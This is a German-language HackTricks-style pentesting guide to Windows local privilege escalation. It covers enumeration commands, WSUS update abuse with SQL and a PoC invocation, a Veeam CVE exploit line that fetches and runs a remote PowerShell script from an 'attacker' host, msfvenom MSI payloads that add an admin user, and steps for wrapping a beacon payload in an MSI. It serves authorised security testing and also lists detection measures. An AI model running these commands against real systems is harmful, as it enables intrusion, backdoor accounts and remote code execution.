# Lokale Rechteausweitung unter Windows

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zur Suche nach Vektoren für lokale Rechteausweitung unter Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Rechteausweitung unter Windows aus mehreren grundlegenden Leitfäden zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Workshops und Checklisten aus der Community.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die Präsentation zur Rechteausweitung unter Windows auf der DerbyCon.<sup>[[5]](#references)</sup>

## Grundlagen zu Windows

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn du nicht weißt, was Integritätsstufen unter Windows sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Unter Windows gibt es verschiedene Dinge, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und all diese **Abwehrmechanismen enumerieren**, bevor du mit der Enumeration zur Rechteausweitung beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann außerdem eine Offline-Änderung des UEFI-NVRAM in eine DMA-Kette vor dem Booten und eine Windows-`SYSTEM`-Speicher-Patching-Kette verwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

Über `RAiLaunchAdminProcess` gestartete UIAccess-Prozesse können missbraucht werden, um ohne Aufforderung High IL zu erreichen, wenn die sicheren Pfadprüfungen von AppInfo umgangen werden. Den speziellen UIAccess-/Admin-Protection-Bypass-Ablauf findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Weitergabe von Registrierungseinstellungen für Barrierefreiheit auf dem Secure Desktop kann für beliebige SYSTEM-Registrierungsschreibvorgänge missbraucht werden (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen LPE-Vektor über **SMB mit beliebigem Port**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration von Versionsinformationen

Prüfe, ob es bekannte Schwachstellen für die Windows-Version gibt (überprüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Site](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Sicherheitslücken in Microsoft-Produkten zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — ermittelt den OS-Build, installierte Updates und ausgewählte potenzielle Advisories; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Prüfe bei einem versionsspezifischen lokalen Exploit sowohl die **Architektur des laufenden Prozesses** als auch die Architektur des Betriebssystems. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein Hinweis auf ein fehlendes KB-Update beweist nicht, dass ein Exploit funktioniert. Vergleiche den aktuellen Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Voraussetzungen des Exploits mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) zum konkreten Problem.

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repositories mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Zugangsdaten oder andere wertvolle Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Hier erfahren Sie, wie Sie dies aktivieren: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell-Transkriptionsrichtlinie](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt Dateien normalerweise in den Ordner „Dokumente“ des jeweiligen Benutzers. Eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann die Dateien jedoch in einen gemeinsam genutzten oder versteckten Ordner umleiten. Prüfe den effektiven Ausgabepfad und die Datei-ACL, bevor du ein Transkript überprüfst: Es kann Befehlsargumente und Ausgaben enthalten, darunter Zugangsdaten. Ein lesbares Transkript ist nur dann ein Hinweis, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und diese Identität sich im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Um dies zu aktivieren, befolge die Anweisungen im Abschnitt „Transkriptdateien“ der Dokumentation und wähle **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowersShell-Protokollen anzuzeigen, können Sie Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Eine vollständige Aufzeichnung der Aktivitäten und Inhalte der Skriptausführung wird erstellt. Dabei wird jeder Codeblock während seiner Ausführung dokumentiert. So entsteht ein umfassender Audit-Trail aller Aktivitäten, der für forensische Untersuchungen und die Analyse bösartiger Aktivitäten wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Logging-Ereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter dem Pfad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Zum Anzeigen der letzten 20 Ereignisse können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ein HTTP-WSUS-Endpunkt ist ein Ansatzpunkt zur Prüfung auf das Abfangen von Update-Metadaten. Die Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien auf dem Client gelten. Die URL allein ermöglicht keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zunächst prüfst du, ob das Netzwerk ein WSUS-Update ohne SSL verwendet, indem du Folgendes in cmd ausführst:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Wenn `UseWUServer` auf `1` gesetzt ist, verwendet Windows Update den konfigurierten Intranetdienst. Damit ist eine Voraussetzung für den HTTP-Interception-Pfad bestätigt, nicht jedoch, dass eine Interception, die Annahme eines bösartigen Updates oder eine Installation mit erhöhten Rechten möglich ist. Wenn der Wert `0` ist, wird dieser konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, kannst du Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden – dabei handelt es sich um weaponized MiTM-Exploit-Skripte, die gefälschte Updates in nicht per SSL geschützten WSUS-Datenverkehr einschleusen.

Lies die Recherche hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lies den vollständigen Bericht hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Wesentlichen wird bei diesem Bug folgende Schwachstelle ausgenutzt:

> Wenn wir unseren lokalen Benutzer-Proxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, können wir PyWSUS lokal ausführen, um unseren eigenen Datenverkehr abzufangen und Code als Benutzer mit erhöhten Rechten auf unserem System auszuführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, greift er auch auf dessen Zertifikatspeicher zu. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses Zertifikat dem Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-first-use-Prüfung des Zertifikats durchzuführen. Wenn das präsentierte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen enthält, akzeptiert der Dienst es.

Du kannst diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht ist).

### Durch WSUS-Administratoren kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfe die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie alle delegierten WSUS-Berechtigungen und ermittle anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte, um Updates zu genehmigen](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung beim Veröffentlichen](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Stelle sicher, dass das betreffende Update signiert und akzeptiert wird, auf das Ziel anwendbar ist und in einem Kontext mit höheren Berechtigungen installiert wird, bevor du dies als Privilege-Escalation-Pfad einstufst. Ein HTTP-`WUServer`-Wert oder Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter Updates in SUSDB: nicht signierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die **gespeicherten Prozeduren der WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstieg besteht darin, das Computerkonto eines vorgeschalteten WSUS-Servers an einen separaten MSSQL-Server weiterzuleiten, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermittle daher zuerst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, findest du unter [Missbrauch von WSUS HTTP für NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Update erstellen, Ziel festlegen und genehmigen

Der Workflow für benutzerdefinierte Updates verwendet legitime WSUS-Prozeduren als eingeschränkte Veröffentlichungs-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzungen sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Inhalts-Hash mit der vom Angreifer kontrollierten URL verknüpfen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Hashes, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem die Inhalts-URL und die Zielgruppe zugewiesen wurden, sieht die abschließende Genehmigung etwa wie folgt aus. Verwende neue Update-, Gruppen- und Bereitstellungskennungen, statt beispielhafte GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS weist beliebige, nicht signierte ausführbare Inhalte normalerweise zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` das Zertifikatsprüfungs-Flag jedoch auf „false“, wenn der angegebene Dateiname mit `.txt` oder `.esd` endet. Dadurch wird `CheckCertificateSignature` übersprungen, ohne zuvor nachzuweisen, dass es sich bei den Bytes um Text oder ein gültiges ESD-Image handelt. Eine unveränderte PE-Datei mit einem Namen wie `payload.exe.txt` kann daher die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Policy-/Type-Confusion-Bug, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Durch den Aufruf von `spDeployUpdate` ruft WSUS den registrierten Inhalt ab. Die Quelle muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung zunächst mit einer `HEAD`-/`GET`-Abfolge beginnt und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung löst ein WSUS-Synchronisierungsereignis `EventId=364` aus, das darauf hinweist, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zu dessen Ausführung und wird mit `BitsWebServer.py` für das Staging von Inhalten ausgeliefert. Ein minimaler Aufruf in einem autorisierten Lab lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch Wiederholungsversuche

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, sorgt dafür, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update fehlgeschlagen/unvollständig blieb, sofort erneut angeboten, nachdem der Callback-Prozess beendet war. Das Wiederholungsverhalten kann so zu einer wiederkehrenden Ausführung als Persistenzmechanismus werden; es ist auffällig, weil der Client einen fehlgeschlagenen Update-Status anzeigt.<sup>[[39]](#references)</sup>

#### Erkennungs- und Härtungsansätze

Nützliche server- und clientseitige Ansätze für diese Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` auditieren; neue Targeting-Gruppen, externe Content-Ursprünge, Update-Payloads mit `.txt`/`.esd` sowie Deployments durch unerwartete Principals untersuchen (insbesondere durch keine Computerkonten).
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, den falsch geschriebenen Eintrag `FileVerficationFailed` und `EventId=364` prüfen; die Verifizierung anhand der Payload-Erweiterung und des Content-Magic-Werts abgleichen, statt dem Suffix zu vertrauen.
- Nach wiederholt fehlschlagenden bzw. erneut gestarteten Windows-Update-Installationen sowie nach PE-Ausführung oder unerwarteten untergeordneten Prozessen bzw. Netzwerkaktivitäten durch Content mit den Namen `.txt` oder `.esd` suchen.
- Sofern unterstützt, Extended Protection for Authentication für den Datenbankdienst verlangen und den Datenbank-Netzwerkzugriff auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Berechtigungen für die Prozeduren für benutzerdefinierte Updates minimieren und auditieren.

## Drittanbieter-Auto-Updater und Agent-IPC (lokale Rechteausweitung)

Viele Enterprise-Agenten stellen eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal bereit. Wenn die Registrierung auf einen Angreifer-Server umgeleitet werden kann und der Updater einer Rogue-Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Sicherheitsmitteilung](https://www.veeam.com/kb4424) beschreibt die unauthentifizierte Offenlegung verschlüsselter Anmeldedaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separater öffentlicher PoC zeigt einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann über localhost hinaus binden. Prüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: Bestätigen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt und die Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Anhaltspunkte, aber keine vollständige Patch-Prüfung.
- **Mindestversionen mit Fehlerbehebung**: Veeam nennt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste Versionen mit Fehlerbehebung; frühere Versionen sind betroffen. Anhand einer vierteiligen Dateiversion allein lässt sich ein ungepatchter Basis-Build nicht von einem späteren Patch mit derselben Build-Nummer unterscheiden. Prüfen Sie die Patch-Kennung anhand der [Build-Historie des Anbieters](https://www.veeam.com/kb2680), bevor Sie einen Build an der Versionsgrenze als behoben einstufen.
- **Exploit**: Eine PoC-Datei wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis ablegen und anschließend über den lokalen Socket einen SYSTEM-Payload auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der zitierte PoC demonstriert die Ausführung von Befehlen als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Anbieters beschreibt das Problem der Offenlegung von Anmeldedaten.
## KrbRelayUp

Ein lokales Kerberos-Relay kann einen Anmeldevorgang mit geringeren Berechtigungen in einen privilegierten Verzeichnisschreibzugriff umwandeln, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Prinzipal über Berechtigungen für das Zielobjekt verfügt. [KrbRelay dokumentiert](https://github.com/cube0x0/KrbRelay) LDAP-Schreibvorgänge sowohl für RBCD als auch für `msDS-KeyCredentialLink` (Shadow Credentials); KrbRelayUp automatisiert einige dieser Angriffspfade. Eine RBCD-Kette erfordert passende Delegierung und Berechtigungen für das Zielobjekt, während eine Shadow-Credential-Kette Schreibberechtigungen für Schlüsselanmeldedaten und einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner dieser Angriffspfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

Prüfe die Richtlinien des tatsächlichen DC für [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Identitätswechselstufen der ausgewählten COM-Klasse. Anmeldetyp und Anmeldeinformationskontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Betrachte eine permissive Richtlinie oder eine passende ACL als Kandidaten für eine Überprüfung; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Verzeichnisschreibvorgänge auslösen. Eine Shadow Credential für ein Computerkonto kann zu einem Machine-Ticket führen und nur dann, wenn dieses Konto über die erforderlichen Verzeichnisreplikationsrechte verfügt, zu einem separaten DCSync-Angriffspfad.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Weitere Informationen zum Ablauf des Angriffs findest du unter [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Wenn** diese 2 Registrierungsschlüssel **aktiviert** sind (Wert **0x1**), können Benutzer mit beliebigen Berechtigungen `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit-Payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Wenn du über eine meterpreter session verfügst, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren.

### PowerUP

Verwende den Befehl `Write-UserAddMSI` von power-up, um im aktuellen Verzeichnis eine Windows-MSI-Datei zur Rechteausweitung zu erstellen. Dieses Skript schreibt einen vorkompilierten MSI-Installer, der zum Hinzufügen eines Benutzers/einer Gruppe auffordert (du benötigst also GUI-Zugriff):

```
Write-UserAddMSI
```

Führe einfach die erstellte Binärdatei aus, um deine Berechtigungen zu erhöhen.

### MSI Wrapper

Lies dieses Tutorial, um zu erfahren, wie du mit diesem Tool einen MSI-Wrapper erstellst. Beachte, dass du eine „**.bat**“-Datei verpacken kannst, wenn du **nur** **Befehlszeilen ausführen** möchtest.


{{#ref}}
msi-wrapper.md
{{#endref}}

### MSI mit WIX erstellen


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### MSI mit Visual Studio erstellen

- **Erzeuge** mit Cobalt Strike oder Metasploit ein **neues Windows-EXE-TCP-Payload** unter `C:\privesc\beacon.exe`.
- Öffne **Visual Studio**, wähle **Create a new project** und gib „installer“ in das Suchfeld ein. Wähle das Projekt **Setup Wizard** aus und klicke auf **Next**.
- Gib dem Projekt einen Namen, zum Beispiel **AlwaysPrivesc**, verwende `C:\privesc` als Speicherort, wähle **place solution and project in the same directory** aus und klicke auf **Create**.
- Klicke so lange auf **Next**, bis du zu Schritt 3 von 4 gelangst (Dateien zum Einschließen auswählen). Klicke auf **Add** und wähle das soeben erstellte Beacon-Payload aus. Klicke anschließend auf **Finish**.
- Markiere das Projekt **AlwaysPrivesc** im **Solution Explorer** und ändere unter **Properties** **TargetPlatform** von **x86** zu **x64**.
  - Du kannst weitere Eigenschaften ändern, etwa **Author** und **Manufacturer**, damit die installierte Anwendung legitimer wirkt.
- Klicke mit der rechten Maustaste auf das Projekt und wähle **View > Custom Actions**.
- Klicke mit der rechten Maustaste auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle die Datei **beacon.exe** aus und klicke auf **OK**. Dadurch wird sichergestellt, dass das Beacon-Payload ausgeführt wird, sobald das Installationsprogramm gestartet wird.
- Ändere unter **Custom Action Properties** **Run64Bit** in **True**.
- Zum Schluss **erstelle den Build**.
